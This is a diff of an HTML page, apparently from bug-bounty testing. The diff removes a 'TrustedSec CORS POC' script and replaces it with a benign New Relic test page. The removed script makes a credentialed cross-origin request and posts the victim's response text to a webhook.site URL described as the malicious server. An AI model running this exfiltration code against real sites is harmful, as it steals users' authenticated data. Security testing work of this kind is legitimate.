@@ -1,31 +1,20 @@
-<html>
-	<head>
-		<title>TrustedSec CORS POC</title>
-	</head>
-	<body>
-		<h1>TrustedSec CORS POC</h>
-		<script>
-			var crossoriginget = new XMLHttpRequest();
-			//The target site with the bad CORS configuration
-			var url = '/';
-			crossoriginget.open('GET', url, true);
-			/*  This tells the browser to send the request with cookies;
-			    requires “Access-Control-Allow-Credentials = true” in
-			    response headers for this.responseText to be readable.  */
-			crossoriginget.withCredentials = true;
-			crossoriginget.onload = reqListener;
-			crossoriginget.send();
-			/*  Once the cross-origin request completes, attempt to read the
-			    response text and send it to the malicious server using an
-			    HTTP POST request.  */
-			function reqListener() {
-				var exfiltraterequest = new XMLHttpRequest();
-				//Our server hosting the CORS attack
-				var maliciousurl = 'https://webhook.site/1867bd0a-9d81-47ef-a868-bbe3aa158e8c';
-				exfiltraterequest.open('POST', maliciousurl);
-				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded,text/html');
-				exfiltraterequest.send('responsehtml=' + String(this.responseText));
-			};
-		</script>
-	</body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>My NewRelic Test App</title>
+</head>
+<body>
+  <h1>New Relic Bug Bounty Test</h1>
+  <p>This is a test page to integrate with New Relic monitoring.</p>
+
+  <script>
+    // Sample AJAX call to simulate frontend behavior
+    fetch("https://jsonplaceholder.typicode.com/posts/1")
+      .then(response => response.json())
+      .then(data => console.log("Fake API Response:", data))
+      .catch(err => console.error("API Error", err));
+  </script>
+</body>
 </html>
